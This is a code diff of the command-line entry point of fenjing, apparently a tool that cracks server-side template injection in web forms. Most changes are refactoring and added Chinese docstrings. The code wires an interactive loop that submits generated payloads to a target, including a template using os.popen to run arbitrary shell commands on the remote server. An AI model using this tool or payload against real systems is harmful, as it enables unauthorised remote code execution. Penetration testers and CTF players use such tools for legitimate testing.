@@ -1,23 +1,14 @@
 """命令行界面的入口
 
 """
-
 import logging
+
 from urllib.parse import urlparse
 from typing import Callable, List, Dict
 from functools import partial
 
 import click
 
-from fenjing.payload_gen import generate
-
-
-from .form import get_form
-from .cracker import Cracker
-from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
-from .full_payload_gen import FullPayloadGen
-from .scan_url import yield_form
-from .requester import Requester
 from .const import (
     OS_POPEN_READ,
     DEFAULT_USER_AGENT,
@@ -25,6 +16,12 @@ from .const import (
     DETECT_MODE_ACCURATE,
 )
 from .colorize import colored, set_enable_coloring
+from .cracker import Cracker
+from .form import get_form
+from .full_payload_gen import FullPayloadGen
+from .requester import Requester
+from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
+from .scan_url import yield_form
 from .webui import main as webui_main
 
 set_enable_coloring()
@@ -48,6 +45,7 @@ TITLE = colored(
 LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
+
 
 def cmd_exec_submitter(
     cmd: str, submitter: Submitter, full_payload_gen: FullPayloadGen
@@ -76,18 +74,28 @@ def cmd_exec_submitter(
     assert result is not None
     return result.text
 
+
 def cmd_exec_generate_func(
     cmd: str, submitter: Submitter, generate_func: Callable, will_print: bool
 ) -> str:
+    """使用submitter和generate_func函数生成并提交cmd对应的payload
+
+    Args:
+        cmd (str): payload对应的shell command
+        submitter (Submitter): 实际发送HTTP请求，提交payload的实例
+        generate_func (Callable): 接受一个string, 生成对应payload的函数
+        will_print (bool): payload是否会生成回显
+
+    Returns:
+        str: 提交结果
+    """
     payload = generate_func(cmd)
     if payload is None:
         logger.warning("%s generating payload.", colored("red", "Failed"))
         return ""
     logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
-        payload_wont_print = (
-            "This payload %s command execution result."
-        )
+        payload_wont_print = "This payload %s command execution result."
         logger.warning(payload_wont_print, colored("red", "won't print"))
     result = submitter.submit(payload)
     assert result is not None
@@ -113,17 +121,26 @@ def interact(cmd_exec_func: Callable):
 
 
 def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
+    """将headers列表和cookie字符串解析为可以传给requests的字典
+
+    Args:
+        headers_list (List[str]): headers列表，元素的格式为'Key: value'
+        cookies (str): Cookie字符串
+
+    Returns:
+        Dict[str, str]: Headers字典
+    """
     headers = {}
     if headers_list:
         for header in headers_list:
-            k, _, v = header.partition(": ")
-            if not k or not v:
-                logger.warning(f"Failed parsing {repr(header)}, ignored.")
+            key, _, value = header.partition(": ")
+            if not key or not value:
+                logger.warning("Failed parsing %s, ignored.", repr(header))
                 continue
-            if k.capitalize() != k:
-                logger.warning(f"Header {k} is not capitalized, fixed.")
-                k = k.capitalize()
-            headers[k] = v
+            if key.capitalize() != key:
+                logger.warning("Header %s is not capitalized, fixed.", key)
+                key = key.capitalize()
+            headers[key] = value
     if cookies:
         headers["Cookie"] = cookies
     return headers
@@ -225,7 +242,10 @@ def get_config(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
 )
 @click.option(
-    "--eval-args-payload", default=False, is_flag=True, help="[试验性]是否在GET参数中传递Eval payload"
+    "--eval-args-payload",
+    default=False,
+    is_flag=True,
+    help="[试验性]是否在GET参数中传递Eval payload",
 )
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@@ -288,13 +308,13 @@ def crack(
         return
     assert submitter is not None and result is not None
     if eval_args_payload:
-        assert isinstance(result,tuple)
+        assert isinstance(result, tuple)
         full_payload_gen, submitter, will_print = result
         cmd_exec_func = partial(
             cmd_exec_generate_func,
-            submitter = submitter,
-            generate_func = lambda x: "__import__('os').popen({}).read()".format(repr(x)),
-            will_print = will_print
+            submitter=submitter,
+            generate_func=lambda x: f"__import__('os').popen({repr(x)}).read()",
+            will_print=will_print,
         )
     else:
         assert isinstance(result, FullPayloadGen)
